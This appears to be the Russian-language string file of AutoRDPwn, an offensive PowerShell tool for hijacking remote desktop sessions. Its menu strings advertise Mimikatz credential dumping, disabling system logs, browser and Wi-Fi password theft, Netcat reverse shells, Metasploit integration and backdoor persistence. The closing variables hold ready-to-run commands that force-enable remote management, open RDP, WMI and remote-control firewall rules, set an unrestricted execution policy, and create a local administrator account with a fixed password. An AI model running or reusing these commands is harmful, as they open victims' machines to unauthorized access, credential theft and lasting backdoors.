[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("cp866")
$txt1  = "Загрузить дополнительные модули"
$txt2  = "Закрыть программу"
$txt3  = "Ваша версия Powershell не совместима с этим сценарием :("
$txt4  = "Вы можете скачать последнюю версию здесь"
$txt5  = "Ваша операционная система не совместима с этой атакой"
$txt6  = "Неверная опция, попробуйте еще раз"
$txt7  = "Выберите способ запуска атаки:` "
$txt8  = "Выберите модуль, который вы хотите загрузить:` "
$txt9  = "Извлекать локальные хеши с помощью Mimikatz"
$txt10 = "Извлечь системные пароли с помощью Mimikatz"
$txt11 = "Перестроить кеш изображений"
$txt12 = "Получить историю удаленного рабочего стола"
$txt13 = "Обнаружена система $system, загружается Mimikatz.."
$txt14 = "Перенаправить локальный порт"
$txt15 = "Перенаправить удаленный порт"
$txt16 = "Проверить фактические перенаправления"
$txt17 = "Удаленный доступ"
$txt18 = "Деактивировать системные журналы"
$txt19 = "Этот процесс может занять несколько минут.."
$txt20 = "Удалить все перенаправления"
$txt21 = "Модуль успешно загружен!"
$txt22 = "Вернуться в главное меню"
$txt23 = "Какой IP-адрес сервера?:` "
$txt24 = "А пользователь?:` "
$txt25 = "Введите пароль:` "
$txt26 = "Введите домен:` "
$txt27 = "Наконец, хеш NTLM:` "
$txt28 = "Повышение привилегий с помощью дублирования токена.."
$txt29 = "Вы хотите видеть или контролировать компьютер?:` "
$txt30 = "Изменение разрешений для просмотра удаленного компьютера.."
$txt31 = "Изменение разрешений для управления удаленным компьютером.."
$txt32 = "Изменения в реестре Windows сделаны успешно!"
$txt33 = "Определение версии операционной системы включено"
$txt34 = "Изменение разрешений для входа без учетных данных.."
$txt35 = "Поиск активных сеансов на компьютере.."
$txt36 = "К какому сеансу вы хотите подключиться?:` "
$txt37 = "обнаружил, применяя изменения.."
$txt38 = "Запуск удаленного подключения!"
$txt39 = "Полуинтерактивная консоль (WinRS)"
$txt40 = "Что-то пошло не так, закрывая программу.."
$txt41 = "Введите локальный порт:` "
$txt42 = "Какой интерфейс вы хотите использовать?:` "
$txt43 = "Введите удаленный порт:` "
$txt44 = "Наконец, IP-адрес назначения:` "
$txt45 = "Перенаправление создано успешно!"
$txt46 = "Конфигурация успешно сохранена!"
$txt47 = "Нет перенаправления для показа"
$txt48 = "Все перенаправления были удалены"
$txt49 = "Получить пароли браузеров с помощью SharpWeb"
$txt50 = "Пароли и хэши"
$txt51 = "Консоль Netcat (прямое соединение)"
$txt52 = "Консоль Netcat (обратное соединение)"
$txt53 = "Введите порт для прослушивания:` "
$txt54 = "Введите удаленный IP:` "
$txt55 = "Введите IP-адрес или диапазон сети:` "
$txt56 = "Введите скорость сканирования (1-5):` "
$txt57 = "Введите количество портов для сканирования (25-1000):` "
$txt58 = "Весь профиль пользователя"
$txt59 = "Восстановить пароли Wi-Fi"
$txt60 = "На этом компьютере нет беспроводной сети"
$txt61 = "Получить учетные данные сеанса RDP"
$txt62 = "Удаленный VNC-сервер (устаревший)"
$txt63 = "Вставить в вашу консоль Metasploit Framework:` "
$txt64 = "Бэкдоры и постоянство"
$txt65 = "Введите IP-адрес, на котором работает MSF:` "
$txt66 = "Все готово! Теперь выполните следующую команду:` "
$txt67 = "Выполнение внешнего скрипта"
$txt68 = "Повышение привилегий"
$txt69 = "Другие модули"
$txt70 = "Получить информацию об операционной системе"
$txt71 = "Поиск уязвимостей с помощью Шерлока"
$txt72 = "Повышение привилегий с помощью PowerUp"
$txt73 = "Введите путь или URL скрипта:` "
$txt74 = "Напишите функцию, которую вы хотите выполнить:` "
$txt75 = "Ожидание закрытия всех процессов.."
$txt76 = "Очистка выполнена!"
$txt77 = "Отмена изменений на удаленном компьютере.."
$txt78 = "Введите имя пользователя:` "
$txt79 = "Изменить пользователя с помощью RunAs"
$txt80 = "Проверка учетных данных на локальном компьютере.."
$txt81 = "Неверные учетные данные! Возвращаемся в главное меню.."
$txt82 = "Загрузка AutoRDPwn с новым пользователем.."
$txt83 = "Выберите метод проверки (хэш / пароль):` "
$txt84 = "Введите хеш NTLM:` "
$txt85 = "Введите протокол, который вы хотите использовать (SMB / WMI):` "
$Pwn1  = "winrm quickconfig -force ; Enable-PSRemoting -Force"
$Pwn2  = "netsh advfirewall firewall set rule group = 'Удаленная помощь' new enable = Yes; netsh advfirewall firewall set rule group='Удаленный рабочий стол' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
$Pwn3  = "netsh advfirewall firewall set rule group = 'Обнаружение сети' new enable = Yes; netsh advfirewall firewall set rule group = 'Удаленное управление запланированными задачами' new enable = yes"
$Pwn4  = "netsh advfirewall firewall set rule group = 'Инструментарий управления Windows (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Удаленное управление Windows' new enable = yes"
$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Администраторы AutoRDPwn /add"
$Pwn6 = "Агент сеанса RDP"
